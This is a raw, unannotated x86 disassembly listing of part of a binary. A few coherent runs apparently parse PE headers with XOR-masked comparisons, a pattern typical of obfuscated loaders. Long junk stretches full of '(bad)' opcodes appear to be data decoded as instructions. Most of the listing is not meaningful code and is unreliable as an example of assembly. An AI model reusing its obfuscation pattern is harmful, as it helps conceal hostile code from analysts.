  408e13:	adc    BYTE PTR [edi],al
  408e15:	nop    DWORD PTR [esi]
  408e18:	outs   dx,WORD PTR ds:[esi]
  408e1a:	loope  0x408dda
  408e1c:	imul   eax,DWORD PTR [edx+0x4a884392],0x16d79181
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x6788556f
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	mov    al,0x19
  408ec6:	outs   dx,DWORD PTR ds:[esi]
  408ec7:	mov    eax,0x64d653e1
  408ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecd:	psubb  mm1,QWORD PTR [ecx-0x3]
  408ed1:	shl    BYTE PTR [eax],0x94
  408ed4:	or     ebx,edi
  408ed6:	lds    ebp,FWORD PTR [edx-0x8]
  408ed9:	add    edi,ecx
  408edb:	add    dh,BYTE PTR [ecx]
  408edd:	ins    DWORD PTR es:[edi],dx
  408ede:	mov    bl,0x6b
  408ee0:	adc    BYTE PTR [ebx],ch
  408ee2:	call   0x48a5:0xefb89132
  408ee9:	inc    ebx
  408eea:	retf   0x3ea7
  408eed:	xchg   edi,eax
  408eee:	mov    eax,ds:0x91c6b17e
  408ef3:	mov    eax,0x190e0b2a
  408ef8:	xchg   edx,eax
  408ef9:	adc    al,0xc0
  408efb:	xchg   edx,eax
  408efc:	shr    DWORD PTR [ecx+0x6a],0x6e
  408f00:	nop
  408f01:	push   0x79fb2245
  408f06:	hlt    
  408f07:	(bad)  
  408f08:	jmp    0x7c0de139
  408f0d:	push   ecx
  408f0e:	fwait
  408f0f:	in     al,0x4
  408f11:	dec    esp
  408f12:	es xor al,0xfb
  408f15:	push   edi
  408f16:	sbb    bl,BYTE PTR [ecx]
  408f18:	adc    DWORD PTR [eax+0x1d31a4fb],edx
  408f1e:	fisubr DWORD PTR [ebp+0x38]
  408f21:	and    BYTE PTR [esi-0xb6793e],cl
  408f27:	(bad)  
  408f28:	(bad)  
  408f2a:	ins    DWORD PTR es:[edi],dx
  408f2b:	sbb    BYTE PTR ds:0xb8cc4688,al
  408f31:	hlt    
  408f32:	into   
  408f33:	bound  esp,QWORD PTR [edi]
  408f35:	rol    BYTE PTR [eax],1
  408f37:	sbb    DWORD PTR [edi],0xbd35bb5
  408f3d:	sbb    al,BYTE PTR [esi-0x19]
  408f40:	enter  0x15bc,0x5e
  408f44:	retf   
  408f45:	enter  0x3d72,0x43
  408f49:	push   ss
  408f4a:	popa   
  408f4b:	adc    edx,DWORD PTR [edx+edi*1+0x2c]
  408f4f:	imul   ebx,DWORD PTR [ecx],0x13
  408f52:	xor    bh,BYTE PTR [eax+0x6a4e6da]
  408f58:	fisub  DWORD PTR [esi-0x232804a1]
  408f5e:	sbb    BYTE PTR ds:[eax-0x22],dl
  408f62:	sbb    BYTE PTR [esi+0x58340c6e],dl
  408f68:	add    DWORD PTR [esi-0x4732c138],eax
  408f6e:	pusha  
  408f6f:	jmp    0x9f2b:0x9d33c8d2
  408f76:	pop    ecx
  408f77:	jg     0x408fa4
  408f79:	dec    eax
  408f7a:	xlat   BYTE PTR ds:[ebx]
  408f7b:	inc    esp
  408f7c:	fs into 
  408f7e:	add    eax,0x246eb548
  408f83:	jp     0x408f12
  408f85:	stc    
  408f86:	adc    BYTE PTR [esi],dh
  408f88:	mov    ds,WORD PTR [ecx]
  408f8a:	repz rcr DWORD PTR [ecx+0x79],0x9d
  408f8f:	(bad)  
  408f90:	adc    esi,esi
  408f92:	sub    BYTE PTR [ecx-0x43],0xd5
  408f96:	hlt    
  408f97:	pop    ebp
  408f98:	jnp    0x408fcb
  408f9a:	xchg   ebx,eax
  408f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f9c:	in     eax,0x4f
  408f9e:	jge    0x408fc4
  408fa0:	adc    ebx,DWORD PTR [edi]
  408fa2:	pop    ebp
  408fa3:	(bad)  [edi-0x2ac5ea0]
  408fa9:	inc    esi
  408faa:	aad    0x8b
  408fac:	lea    ebp,[edx-0x330b89e0]
  408fb2:	aam    0xf3
  408fb4:	or     BYTE PTR [edx+0x2],0x6
  408fb8:	aad    0x12
  408fba:	push   edx
  408fbb:	inc    cl
  408fbd:	cdq    
  408fbe:	jge    0x409026
  408fc0:	fidiv  DWORD PTR [esi-0x550d962]
  408fc6:	(bad)  
  408fc7:	xchg   edx,eax
  408fc8:	push   esp
  408fc9:	fdivr  DWORD PTR [edx-0x57]
  408fcc:	or     dh,0x17
  408fcf:	ret    0x9797
  408fd2:	or     BYTE PTR [esi+0x2b291584],ah
  408fd8:	sbb    dl,BYTE PTR [ebx-0x4c]
  408fdb:	pop    edx
  408fdc:	xor    al,0x71
  408fde:	jbe    0x408f7c
  408fe0:	inc    ebp
  408fe1:	push   ss
  408fe2:	push   edx
  408fe3:	xor    dl,ah
  408fe5:	sar    BYTE PTR [edx+0x2a6110d9],cl
  408feb:	adc    al,0x62
  408fed:	push   ebx
  408fee:	mov    dh,0x37
  408ff0:	rol    DWORD PTR [ecx-0x30],0x5f
  408ff4:	xor    bh,BYTE PTR [ecx+0x41636503]
  408ffa:	cmp    eax,0xebcf63c7
  408fff:	xor    BYTE PTR [edi-0x1038cb5d],bh
  409005:	sbb    edx,DWORD PTR [ecx+0x41bc2df2]
  40900b:	ret    0xac3c
  40900e:	jo     0x408ffe
  409010:	add    bh,BYTE PTR [esi-0x70]
  409013:	sbb    eax,DWORD PTR [ebx+edi*4]
  409016:	xor    BYTE PTR ds:0x22cd6a86,dl
  40901c:	sbb    al,0xd4
  40901e:	add    eax,0x85dd1517
  409023:	cmp    bh,BYTE PTR [ebx+esi*2+0x53]
  409027:	fwait
  409028:	mov    BYTE PTR [ebx],dl
  40902a:	repz adc eax,DWORD PTR [edx-0x77]
  40902e:	xchg   esi,eax
  40902f:	out    dx,eax
  409030:	jmp    0x409033
  409032:	add    BYTE PTR [edi+0x59b18512],cl
  409038:	leave  
  409039:	push   eax
  40903a:	ja     0x408fe0
  40903c:	loopne 0x409055
  40903e:	fwait
  40903f:	lahf   
  409040:	adc    BYTE PTR [ecx+0x65],dl
  409043:	mov    cl,0x17
  409045:	or     al,0xbd
  409047:	xchg   ecx,eax
  409048:	mov    eax,es:0x9220b792
  40904e:	and    dl,BYTE PTR [esi]
  409050:	lods   al,BYTE PTR ds:[esi]
  409051:	mov    dl,0xe8
  409053:	sub    DWORD PTR [ebp+0x5cf543ab],edi
  409059:	xlat   BYTE PTR ds:[ebx]
  40905a:	mov    bh,0xb0
  40905c:	lds    esp,FWORD PTR [edx]
  40905e:	test   eax,0x17143d93
  409063:	outs   dx,BYTE PTR ds:[esi]
  409064:	pop    esi
  409065:	inc    esi
  409066:	jns    0x40902e
  409068:	(bad)  
  409069:	push   ebp
  40906a:	dec    ebx
  40906b:	adc    DWORD PTR [ebp-0x26767b18],ebx
  409071:	and    ecx,ecx
  409073:	sbb    DWORD PTR [edi],edi
  409075:	mov    cl,0xa7
  409077:	(bad)  
  409078:	std    
  409079:	cmp    dh,BYTE PTR [eax-0x6b6607bf]
  40907f:	ds in  al,0x48
  409082:	fwait
  409083:	retf   
  409084:	push   edi
  409085:	data16 repz (bad) 
  409088:	out    dx,al
  409089:	add    BYTE PTR [edx-0x6c],0x37
  40908d:	les    ebx,FWORD PTR [ebx-0x31]
  409090:	cmp    BYTE PTR [ebp+0x41],dh
  409093:	arpl   WORD PTR [ebx+0xb0b1b4d],cx
  409099:	ret    0x8019
  40909c:	cs dec esp
  40909e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090a0:	and    DWORD PTR [ebx],edi
  4090a2:	jbe    0x409085
  4090a4:	hlt    
  4090a5:	mov    cl,0xa
  4090a7:	or     ebp,DWORD PTR [esp+ebp*1+0x14]
  4090ab:	or     al,ah
  4090ad:	jmp    0x409087
  4090af:	push   edx
  4090b0:	es dec esp
  4090b2:	mov    BYTE PTR [edx-0x6f465d94],0xd5
  4090b9:	jmp    0xb0ae:0x48229bc9
  4090c0:	(bad)  
  4090c1:	fmul   DWORD PTR [ebx-0x2d]
  4090c4:	(bad)  
  4090c5:	fdiv   QWORD PTR [esi+0x40]
  4090c8:	bound  ebx,QWORD PTR es:[edi-0x5014cce0]
  4090cf:	nop
  4090d0:	inc    edx
  4090d1:	cmp    DWORD PTR [esp+eax*1+0x18],edi
  4090d5:	inc    ebx
  4090d6:	addr16 clc 
  4090d8:	jmp    0x9d46ac31
  4090dd:	fsubr  QWORD PTR [edi]
  4090df:	cmp    dh,BYTE PTR [ecx-0x28]
  4090e2:	jmp    0x409146
  4090e4:	stc    
  4090e5:	test   BYTE PTR [edi],cl
  4090e7:	jecxz  0x409156
  4090e9:	in     eax,0xa
  4090eb:	cli    
  4090ec:	cld    
  4090ed:	sbb    al,0x33
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x8f
  409163:	fsubr  QWORD PTR [eax-0x5e]
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	or     bh,BYTE PTR [edx-0xf]
  409171:	aad    0x65
  409173:	mov    WORD PTR [ecx],?
  409175:	and    cl,BYTE PTR [eax-0x33]
  409178:	in     al,0x1c
  40917a:	jle    0x409122
  40917c:	sub    cl,BYTE PTR [eax-0x48dfb0a7]
  409182:	mov    dl,0x9b
  409184:	les    ecx,FWORD PTR [esi]
  409186:	push   ds
  409187:	nop
  409188:	out    dx,eax
  409189:	jmp    0x409128
  40918b:	sbb    ecx,ebp
  40918d:	out    0x81,eax
  40918f:	inc    ebx
  409190:	repz rep lods al,BYTE PTR ds:[esi]
  409193:	cmp    eax,0x3eaaacad
  409198:	and    DWORD PTR [edi],eax
  40919a:	mov    WORD PTR [ecx-0x5d058271],ss
  4091a0:	sbb    eax,0xbadf8868
  4091a5:	jge    0x4091ac
  4091a7:	pushf  
  4091a8:	add    al,0xb6
  4091aa:	xchg   ebp,eax
  4091ab:	pop    edi
  4091ac:	stc    
  4091ad:	rol    DWORD PTR [esi+0x50b28607],1
  4091b3:	fs retf 
  4091b5:	cmp    esi,DWORD PTR [eax-0x2c]
  4091b8:	adc    BYTE PTR [eax+0x37],dh
  4091bb:	aam    0x55
  4091bd:	jb     0x409144
  4091bf:	cmp    al,cl
  4091c1:	cmp    BYTE PTR [eax-0x7],dl
  4091c4:	sub    BYTE PTR [ebp-0x18],ah
  4091c7:	jl     0x409239
  4091c9:	fwait
  4091ca:	or     esi,esp
  4091cc:	push   ebp
  4091cd:	fimul  WORD PTR [edi-0x24]
  4091d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d1:	jle    0x4091af
  4091d3:	rcr    DWORD PTR [ecx+0x6],0x38
  4091d7:	leave  
  4091d8:	loopne 0x409214
  4091da:	and    al,0xb9
  4091dc:	sbb    al,0xb3
  4091de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091df:	jmp    0xaaad37a3
  4091e4:	pop    ebx
  4091e5:	loop   0x4091fc
  4091e7:	stos   DWORD PTR es:[edi],eax
  4091e8:	mov    ch,0xa9
  4091ea:	jae    0x4091bf
  4091ec:	call   0x1993:0x718e85ad
  4091f3:	inc    esi
  4091f4:	dec    esi
  4091f5:	test   al,0xad
  4091f7:	sub    eax,0x8407df06
  4091fc:	dec    ebx
  4091fd:	test   DWORD PTR [esi-0x5e45a93],ebp
  409203:	sub    eax,0x81916a0c
  409208:	out    dx,al
  409209:	jno    0x409283
  40920b:	dec    edi
  40920c:	pop    ds
  40920d:	cmp    ebp,0x2d44addb
  409213:	test   eax,0x3989dffa
  409218:	imul   edi,DWORD PTR [esi-0x5b],0x1fd91d7
  40921f:	cs dec edi
  409221:	xor    DWORD PTR [ecx],edi
  409223:	add    DWORD PTR [esi],esi
  409225:	fisttp WORD PTR [ecx+0x425d8c3c]
  40922b:	push   ebp
  40922c:	jb     0x409244
  40922e:	jmp    0x43b:0x64b08488
  409235:	adc    eax,DWORD PTR [ebp+ebx*2-0x54]
  409239:	pop    esi
  40923a:	dec    esi
  40923b:	xchg   edi,eax
  40923c:	fcomp  QWORD PTR gs:[ebx]
  40923f:	mov    ds:0x2e6104c1,al
  409244:	mov    edx,0x142d7947
  409249:	cwde   
  40924a:	iret   
  40924b:	arpl   dx,si
  40924d:	shr    BYTE PTR [ebx-0x21c0cdfe],1
  409253:	clc    
  409254:	repnz sbb dl,dl
  409257:	out    dx,eax
  409258:	inc    bh
  40925a:	adc    eax,0xeaf66a5d
  409260:	xchg   esi,eax
  409261:	xor    al,0x22
  409263:	mov    dh,0x2e
  409265:	imul   edi,esp,0xc
  409268:	sub    eax,0xc92794a2
  40926d:	call   0x876e:0x6980e591
  409274:	jb     0x4092b7
  409276:	stos   DWORD PTR es:[edi],eax
  409277:	sbb    DWORD PTR [ecx],edx
  409279:	jp     0x40924f
  40927b:	imul   ecx,DWORD PTR [ecx+0x60450b6b],0x23c27fd5
  409285:	ins    BYTE PTR es:[edi],dx
  409286:	xchg   esp,eax
  409287:	imul   edi,DWORD PTR [ebx+0x446ffcc8],0x5c0720cd
  409291:	int    0x37
  409293:	imul   edx,edx,0x45
  409296:	cli    
  409297:	jmp    0x6b9c:0x1f153c33
  40929e:	popf   
  40929f:	sub    al,0x6e
  4092a1:	jns    0x40930d
  4092a3:	fisttp DWORD PTR [eax-0x50]
  4092a6:	cmp    DWORD PTR [esi],0xfffffffd
  4092a9:	xor    BYTE PTR [edx+0x79c527a1],al
  4092af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092b0:	cmc    
  4092b1:	cmp    al,0x13
  4092b3:	xor    al,bh
  4092b5:	mov    esp,0x379c3ffe
  4092bb:	daa    
  4092bc:	cmp    edi,DWORD PTR [eax-0x2e00bda2]
  4092c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c3:	daa    
  4092c4:	out    0x48,al
  4092c6:	jge    0x409271
  4092c8:	mov    edi,0xb6e051a5
  4092cd:	sub    DWORD PTR [esi+0x4eb1e9ab],esp
  4092d3:	lods   al,BYTE PTR ds:[esi]
  4092d4:	adc    al,0xfe
  4092d6:	pushf  
  4092d7:	mov    eax,0x68bd77e6
  4092dc:	fwait
  4092dd:	adc    al,BYTE PTR [ebp+0x4d]
  4092e0:	mov    DWORD PTR [ebp+0x36],0x5b5268d5
  4092e7:	shl    bl,1
  4092e9:	sbb    ah,dh
  4092eb:	test   BYTE PTR [esi+0xec77e59],ah
  4092f1:	jbe    0x4092a8
  4092f3:	jno    0x409373
  4092f5:	xor    BYTE PTR [edx+ecx*1],bh
  4092f8:	outs   dx,BYTE PTR fs:[esi]
  4092fa:	(bad)  
  4092fb:	in     eax,dx
  4092fc:	imul   esi,DWORD PTR [edx+eax*4-0x1ba13c1a],0x3b
  409304:	adc    bl,dh
  409306:	and    eax,0x142ca0dd
  40930b:	pop    ss
  40930c:	push   0x48
  40930e:	inc    edx
  40930f:	in     eax,0x4c
  409311:	popf   
  409312:	scas   eax,DWORD PTR es:[edi]
  409313:	rcl    BYTE PTR [edi-0x47],cl
  409316:	sub    ch,BYTE PTR [esi+0x58]
  409319:	dec    ebp
  40931a:	cli    
  40931b:	sahf   
  40931c:	nop
  40931d:	imul   eax,DWORD PTR [ebx+0x68],0x74
  409321:	in     eax,0xbb
  409323:	xchg   edi,eax
  409324:	iret   
  409325:	sti    
  409326:	ins    DWORD PTR es:[edi],dx
  409327:	fcomp  QWORD PTR fs:[ecx-0x531be26]
  40932e:	sar    BYTE PTR [edx+0x8d330c2],1
  409334:	int    0x47
  409336:	aad    0xa
  409338:	ret    
  409339:	inc    ebx
  40933a:	addr16 loope 0x40935c
  40933d:	popf   
  40933e:	sahf   
  40933f:	xor    ecx,DWORD PTR [edi*8+0xcd8affd]
  409346:	pop    ds
  409347:	mov    ecx,0xd8d12c74
  40934c:	mov    esp,esi
  40934e:	imul   edi,DWORD PTR [edi+0x56b0e43b],0xa908857f
  409358:	jle    0x409370
  40935a:	add    DWORD PTR [esi],ebx
  40935c:	lods   eax,DWORD PTR ds:[esi]
  40935d:	outs   dx,BYTE PTR ds:[esi]
  40935e:	mov    dh,0xc3
  409360:	mov    WORD PTR [ecx+0x2],?
  409363:	mov    ds:0x9246057,eax
  409368:	dec    esp
  409369:	xor    al,0xb4
  40936b:	cli    
  40936c:	xlat   BYTE PTR ds:[ebx]
  40936d:	push   ecx
  40936e:	gs loope 0x4093df
  409371:	sti    
  409372:	pop    ds
  409373:	jge    0x409322
  409375:	pop    edx
  409376:	outs   dx,BYTE PTR es:[esi]
  409378:	in     eax,0x71
  40937a:	mov    ss,WORD PTR [esi-0x63]
  40937d:	jne    0x40930e
  40937f:	dec    ecx
  409380:	sub    dl,BYTE PTR [ebx+0x7b7efc84]
  409386:	fistp  DWORD PTR [ebp-0x5f32778f]
  40938c:	jo     0x4093ba
  40938e:	jp     0x40939a
  409390:	push   ds
  409391:	xlat   BYTE PTR ds:[ebx]
  409392:	push   edx
  409393:	inc    esp
  409394:	sar    BYTE PTR [ecx+edx*8],1
  409397:	stos   DWORD PTR es:[edi],eax
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	jno    0x40935d
  4093b6:	or     ebp,DWORD PTR [edi]
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	xlat   BYTE PTR ds:[ebx]
  4093c1:	(bad)  
  4093c2:	mov    dl,0x4e
  4093c4:	pop    ecx
  4093c5:	cmp    DWORD PTR [ecx+0x1512b9d7],edi
  4093cb:	jns    0x4093e6
  4093cd:	xor    BYTE PTR [edi+ecx*8],al
  4093d0:	add    ch,bh
  4093d2:	mov    ebx,fs
  4093d4:	add    BYTE PTR [ebp-0x32],ch
  4093d7:	aaa    
  4093d8:	pop    esi
  4093d9:	leave  
  4093da:	lahf   
  4093db:	add    al,0x64
  4093dd:	arpl   WORD PTR [ebx+edi*1+0x5e],sp
  4093e1:	jp     0x4093be
  4093e3:	xchg   edx,eax
  4093e4:	xchg   edi,eax
  4093e5:	test   eax,0x546b9fba
  4093ea:	call   0x561aab1a
  4093ef:	scas   eax,DWORD PTR es:[edi]
  4093f0:	add    BYTE PTR [esi-0x4362a547],ah
  4093f6:	mov    cl,BYTE PTR [ebx-0x6b]
  4093f9:	fmul   QWORD PTR [edx-0x139a52a8]
  4093ff:	sub    bh,BYTE PTR [edi]
  409401:	and    DWORD PTR [edi+0x27],esi
  409404:	into   
  409405:	xor    BYTE PTR [esp+ebp*8+0x5293deb8],cl
  40940c:	and    BYTE PTR [ecx*4+0x7d4fd9ad],bl
  409413:	sub    ebx,edx
  409415:	inc    edx
  409416:	jo     0x4093b2
  409418:	xchg   ecx,eax
  409419:	xor    eax,0xff7f618e
  40941e:	jne    0x4093c2
  409420:	pop    eax
  409421:	jp     0x4093e4
  409423:	or     DWORD PTR [edx+0x3a],edx
  409426:	pushf  
  409427:	hlt    
  409428:	lods   eax,DWORD PTR ds:[esi]
  409429:	sbb    ch,dh
  40942b:	push   ebp
  40942c:	test   eax,0xbce50e6b
  409431:	mov    bh,0xcf
  409433:	jecxz  0x409425
  409435:	mov    ebp,0x8edf07c9
  40943a:	gs fs dec ebp
  40943d:	xor    esi,DWORD PTR [eax-0x59293603]
  409443:	lds    esi,FWORD PTR [eax]
  409445:	cmp    DWORD PTR [ebp-0x55],edi
  409448:	jle    0x409406
  40944a:	push   cs
  40944b:	cmp    ecx,DWORD PTR [edi+0x20fd585a]
  409451:	stos   BYTE PTR es:[edi],al
  409452:	ja     0x40941b
  409454:	enter  0xc592,0xeb
  409458:	out    dx,al
  409459:	jmp    0x4094a0
  40945b:	jns    0x409451
  40945d:	cmp    al,0x49
  40945f:	stos   BYTE PTR es:[edi],al
  409460:	pop    esi
  409461:	in     eax,0x37
  409463:	cwde   
  409464:	xor    al,0x28
  409466:	mov    bl,0x5c
  409468:	pop    es
  409469:	in     al,dx
  40946a:	sbb    dh,BYTE PTR [ecx+0x6d13c52a]
  409470:	leave  
  409471:	pop    esp
  409472:	mov    edx,0x2ef6eb4f
  409477:	(bad)  
  409478:	mov    ebx,0x36a2b5f4
  40947d:	inc    edx
  40947e:	push   ebx
  40947f:	icebp  
  409480:	lds    ebx,FWORD PTR [ebp+0x28]
  409483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409484:	int    0xd4
  409486:	sahf   
  409487:	loope  0x409473
  409489:	inc    edi
  40948a:	sbb    cl,BYTE PTR [ecx-0x4f83463b]
  409490:	(bad)  
  409491:	sub    ah,BYTE PTR [ecx+0x362996d0]
  409497:	inc    ebp
  409498:	inc    edx
  409499:	or     DWORD PTR [edx-0x5f],eax
  40949c:	xchg   ebx,eax
  40949d:	push   esp
  40949e:	mov    edx,0x7a1dd478
  4094a3:	outs   dx,DWORD PTR ds:[esi]
  4094a4:	jo     0x4094ae
  4094a6:	cmp    DWORD PTR [esi+0x66031c2e],0xd370236f
  4094b0:	xchg   esp,eax
  4094b1:	stos   DWORD PTR es:[edi],eax
  4094b2:	pop    edx
  4094b3:	jno    0x4094c7
  4094b5:	int    0x9a
  4094b7:	stc    
  4094b8:	pop    es
  4094b9:	imul   ecx,DWORD PTR [ebp-0x2ac23bd2],0xf08a0cb6
  4094c3:	shl    al,0x76
  4094c6:	pushf  
  4094c7:	xor    esi,esi
  4094c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094ca:	or     dl,dh
  4094cc:	push   ds
  4094cd:	jo     0x4094a2
  4094cf:	mov    ds:0x650c4628,al
  4094d4:	xchg   DWORD PTR ss:[ebp-0x23],eax
  4094d8:	jne    0x409499
  4094da:	xchg   DWORD PTR [edx],eax
  4094dc:	inc    edx
  4094dd:	jnp    0x409481
  4094df:	xchg   edx,eax
  4094e0:	jns    0x409554
  4094e2:	cdq    
  4094e3:	sub    DWORD PTR [ecx+0x35],0xffffffc5
  4094e7:	add    BYTE PTR [edi-0x13],ah
  4094ea:	mov    ds:0x7ea5e34,eax
  4094ef:	shr    DWORD PTR [eax+0x542ac2cd],cl
  4094f5:	dec    eax
  4094f6:	dec    eax
  4094f7:	das    
  4094f8:	mov    bl,0x3b
  4094fa:	fistp  WORD PTR [ebx+0x7118ffad]
  409500:	jmp    0xc8d1a20
  409505:	imul   edi,eax,0x4aecab7
  40950b:	mov    ebx,0xc72506b8
  409510:	adc    eax,DWORD PTR [esi+0x68057ecc]
  409516:	fst    QWORD PTR [esi+edx*8-0x52fceccf]
  40951d:	jo     0x4094a7
  40951f:	add    al,0x35
  409521:	loop   0x4094cf
  409523:	push   0xbcf7d095
  409528:	xchg   DWORD PTR [edi+0x4f],ebp
  40952b:	xor    dh,dh
  40952d:	adc    DWORD PTR [esi+0x11],edi
  409530:	into   
  409531:	pop    ecx
  409532:	jle    0x4094f1
  409534:	sbb    ebp,DWORD PTR [edx-0x51]
  409537:	mov    eax,DWORD PTR [ebp-0x1e5093d1]
  40953d:	jecxz  0x4094fc
  40953f:	retf   
  409540:	xchg   esp,eax
  409541:	and    BYTE PTR [edi+0x4a7ef7f0],0x62
  409548:	adc    ebp,DWORD PTR [ebx-0x51f7134d]
  40954e:	fistp  QWORD PTR [esi]
  409550:	push   ss
  409551:	cmc    
  409552:	pop    es
  409553:	test   DWORD PTR [edi-0x28],esi
  409556:	sbb    BYTE PTR [edx],bl
  409558:	imul   ebp,DWORD PTR ss:[ebx],0x3
  40955c:	js     0x4095da
  40955e:	or     DWORD PTR [edi+ebp*4-0x7e],0x30ea5361
  409566:	cmp    eax,0x117bb015
  40956b:	int3   
  40956c:	fs push eax
  40956e:	add    edx,ebx
  409570:	add    al,0xc5
  409572:	jnp    0x40957a
  409574:	nop
  409575:	mov    ecx,0x197870e7
  40957a:	add    BYTE PTR [eax+0x4e31ad0c],0x97
  409581:	(bad)  
  409582:	push   edi
  409583:	outs   dx,DWORD PTR cs:[esi]
  409585:	shr    DWORD PTR [esi+0x6312fe40],cl
  40958b:	sahf   
  40958c:	xchg   edi,eax
  40958d:	test   BYTE PTR [edx-0x7a],ch
  409590:	fidivr WORD PTR [eax-0x51]
  409593:	and    al,0xb1
  409595:	cld    
  409596:	cmc    
  409597:	xchg   esp,eax
  409598:	push   cs
  409599:	fsub   QWORD PTR [esi+0x782bd145]
  40959f:	call   0x830e86a8
  4095a4:	adc    eax,0x325cc850
  4095a9:	xor    ebx,DWORD PTR [esp+ebx*8+0x44eea393]
  4095b0:	in     al,dx
  4095b1:	sub    dl,BYTE PTR [esi+0x69]
  4095b4:	jmp    0x385f:0x2c78e053
  4095bb:	push   edi
  4095bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095bd:	mov    ds:0x5da17742,eax
  4095c2:	pop    ebp
  4095c3:	daa    
  4095c4:	test   eax,0xcef582ce
  4095c9:	xchg   ecx,eax
  4095ca:	jmp    0x87c424be
  4095cf:	mov    ebx,0x6ecd6071
  4095d4:	test   edi,edi
  4095d6:	push   ebp
  4095d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d8:	pavgw  mm3,QWORD PTR [ebx+0x47a768ec]
  4095df:	imul   ecx,DWORD PTR [edx-0x3c],0x5e
  4095e3:	mov    es,WORD PTR [ebp-0x5d09f406]
  4095e9:	ret    0x20e8
  4095ec:	aad    0xff
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e7b:0xc320754e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	push   ebx
